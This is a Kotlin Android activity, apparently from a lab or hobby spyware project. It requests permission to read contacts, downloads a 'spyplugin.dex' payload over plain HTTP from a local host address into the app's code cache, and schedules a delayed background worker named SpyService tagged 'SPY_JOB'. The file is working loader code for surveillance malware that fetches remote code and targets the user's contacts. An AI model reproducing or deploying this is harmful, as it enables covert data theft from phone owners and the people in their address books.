package com.example.background

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.main_activity)
        Toast.makeText(this, "Приложение запущено автоматически", Toast.LENGTH_LONG).show()

        val textView = findViewById<TextView>(R.id.textViewStatus)
        val start_button = findViewById<Button>(R.id.buttonStart)
        val stop_button = findViewById<Button>(R.id.buttonStop)

        Log.d("Main", "Активность запущена")
        //requestContactPermission()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                100
            )
        }

        start_button.setOnClickListener {
            requestContactPermission()
            textView.text = getString(R.string.text_start)
        }

        stop_button.setOnClickListener {
            stopTask()
            textView.text = getString(R.string.text_stop)
        }
    }

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            startTask()
        } else {
            Log.d("Perm", "Permission denied")
        }
    }

    fun requestContactPermission() {
        when {
            ContextCompat.checkSelfPermission(
                this,
                android.Manifest.permission.READ_CONTACTS
            ) == PackageManager.PERMISSION_GRANTED -> {
                startTask()
            }
            ActivityCompat.shouldShowRequestPermissionRationale(
                this,
                android.Manifest.permission.READ_CONTACTS
            ) -> {
                Log.d("Perm", "Permission denied")
            }
            else -> {
                requestPermissionLauncher.launch(android.Manifest.permission.READ_CONTACTS)
            }
        }
    }

    private fun startTask() {
        val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()

        lifecycleScope.launch {
            val file = downloadDex(this@MainActivity, "http://10.0.2.2:8000/spyplugin.dex")
            val quickWorkRequest = OneTimeWorkRequestBuilder<SpyService>()
                .addTag("SPY_JOB")
                .setConstraints(constraints)
                .setInitialDelay(1, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(this@MainActivity).enqueue(quickWorkRequest)
        }
    }

    private fun stopTask() = WorkManager.getInstance(this@MainActivity).cancelAllWorkByTag("SPY_JOB")

    suspend fun downloadDex(context: Context, urlString: String): File =
        withContext(Dispatchers.IO) {

            val tempFile = File(context.codeCacheDir, "spyplugin.tmp")
            val finalFile = File(context.codeCacheDir, "spyplugin.dex")

            if (tempFile.exists()) tempFile.delete()

            val url = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.connectTimeout = 60000
            connection.readTimeout = 60000
            connection.requestMethod = "GET"
            connection.doInput = true

            connection.setRequestProperty("Accept-Encoding", "")
            connection.setRequestProperty("Connection", "keep-alive")

            connection.connect()

            if (connection.responseCode != HttpURLConnection.HTTP_OK) {
                throw Exception("HTTP ${connection.responseCode}")
            }

            val buffer = ByteArray(8192)

            connection.inputStream.use { input ->
                FileOutputStream(tempFile).use { output ->
                    while (true) {
                        val bytes = input.read(buffer)
                        if (bytes <= 0) break
                        output.write(buffer, 0, bytes)
                    }
                    output.flush()
                }
            }

            connection.disconnect()

            if (tempFile.length() < 1000) {
                tempFile.delete()
                throw Exception("File too small")
            }

            finalFile.delete()
            tempFile.renameTo(finalFile)

            finalFile.setWritable(false)

            finalFile
        }
}